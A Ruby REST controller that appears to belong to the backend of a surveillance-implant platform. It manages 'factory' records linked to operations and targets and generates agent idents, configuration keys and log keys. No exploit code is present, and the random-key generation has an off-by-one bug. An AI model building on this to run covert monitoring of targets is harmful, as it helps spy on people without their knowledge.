module RCS
module DB

class FactoryController < RESTController
  
  def index
    require_auth_level :tech, :view
    
    filter = JSON.parse(@params['filter']) if @params.has_key? 'filter'
    filter ||= {}

    filter.merge!({_id: {"$in" => @session[:accessible]}, _kind: 'factory'})

    mongoid_query do
      db = Mongoid.database
      j = db.collection('items').find(filter, :fields => ["name", "desc", "status", "_kind", "path", "type", "ident"])
      ok(j)
    end
  end
  
  def show
    require_auth_level :tech, :view

    return not_found() unless @session[:accessible].include? BSON::ObjectId.from_string(@params['_id'])

    mongoid_query do
      db = Mongoid.database
      j = db.collection('items').find({_id: BSON::ObjectId.from_string(@params['_id'])}, :fields => ["name", "desc", "status", "_kind", "path", "ident", "counter", "configs"])
      ok(j.first)
    end
  end
  
  def create
    require_auth_level :tech
    
    # to create a target, we need to owning operation
    return bad_request('INVALID_OPERATION') unless @params.has_key? 'operation'
    return bad_request('INVALID_TARGET') unless @params.has_key? 'target'
    
    mongoid_query do

      operation = ::Item.operations.find(@params['operation'])
      return bad_request('INVALID_OPERATION') if operation.nil?

      target = ::Item.targets.find(@params['target'])
      return bad_request('INVALID_TARGET') if target.nil?

      # used to generate log/conf keys and seed
      alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-'

      item = Item.create!(desc: @params['desc']) do |doc|
        doc[:_kind] = :factory
        doc[:path] = [operation._id, target._id]
        doc[:status] = :open
        doc[:ident] = get_new_ident
        doc[:name] = @params['name']
        doc[:name] ||= doc[:ident]
        doc[:counter] = 0
        seed = (0..11).inject('') {|x,y| x += alphabet[rand(0..alphabet.size)]}
        seed.setbyte(8, 46)
        doc[:seed] = seed
        doc[:confkey] = (0..31).inject('') {|x,y| x += alphabet[rand(0..alphabet.size)]}
        doc[:logkey] = (0..31).inject('') {|x,y| x += alphabet[rand(0..alphabet.size)]}
        doc[:configs] = []
      end

      @session[:accessible] << item._id

      Audit.log :actor => @session[:user][:name],
                :action => "factory.create",
                :operation_name => operation['name'],
                :target_name => target['name'],
                :agent_name => item['name'],
                :desc => "Created factory '#{item['name']}'"

      item = Item.factories
        .only(:name, :desc, :status, :_kind, :path, :ident, :counter, :configs)
        .find(item._id)

      ok(item)
    end
  end

  def get_new_ident
    global = ::Item.where({_kind: 'global'}).first
    global ||= ::Item.new({_kind: 'global', counter: 0}).save
    global.inc(:counter, 1)
    "RCS_#{global.counter.to_s.rjust(10, "0")}"
  end
  
  def update
    require_auth_level :tech
    
    updatable_fields = ['name', 'desc', 'status']

    mongoid_query do
      item = Item.factories.any_in(_id: @session[:accessible]).find(@params['_id'])

      @params.delete_if {|k, v| not updatable_fields.include? k }
      
      @params.each_pair do |key, value|
        if item[key.to_s] != value and not key['_ids']
          Audit.log :actor => @session[:user][:name],
                    :action => "#{item._kind}.update",
                    (item._kind + '_name').to_sym => item['name'],
                    :desc => "Updated '#{key}' to '#{value}' for #{item._kind} '#{item['name']}'"
        end
      end
      
      item.update_attributes(@params)
      
      item = Item.factories
        .only(:name, :desc, :status, :_kind, :path, :ident, :counter, :configs)
        .find(item._id)
      
      return ok(item)
    end
  end
  
  def destroy
    require_auth_level :tech
    
    mongoid_query do
      item = Item.factories.any_in(_id: @session[:accessible]).find(@params['_id'])
      item.destroy
      
      Audit.log :actor => @session[:user][:name],
                :action => "#{item._kind}.delete",
                (item._kind + '_name').to_sym => @params['name'],
                :desc => "Deleted #{item._kind} '#{item['name']}'"
      
      return ok
    end
  end

end

end
end